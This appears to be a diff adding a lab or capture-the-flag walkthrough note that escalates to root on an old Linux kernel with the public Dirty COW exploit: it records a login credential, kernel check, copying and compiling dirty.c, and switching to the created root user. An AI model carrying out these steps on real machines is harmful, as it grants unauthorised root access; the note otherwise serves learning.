@@ -1,0 +1,29 @@
+login : pw
+	end : 3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
+
+uname -r
+	=> 3.2.0-90-generic-pae
+		=> kernel version
+
+2.6.22 < 3.2.0 < 3.9
+	=> dirtycow may work
+
+Lets try
+
+https://www.exploit-db.com/exploits/40839
+	=> Ressources/dirty.c
+
+scp -P 4242 dirty.c end@192.168.1.20:/tmp/dirty.c
+
+gcc -pthread dirty.c -o dirty -lcrypt
+./dirty
+	=> put your passwd
+
+su firefart
+	=> enter password
+		=> You become firefart which is root
+
+dirtycow is a known vulnerability for old linux kernel
+	=> It exploits a race condition in the copy-on-write mechanism of memory management system
+	=> the idea is to change a read-only mapping into a writable mapping
+
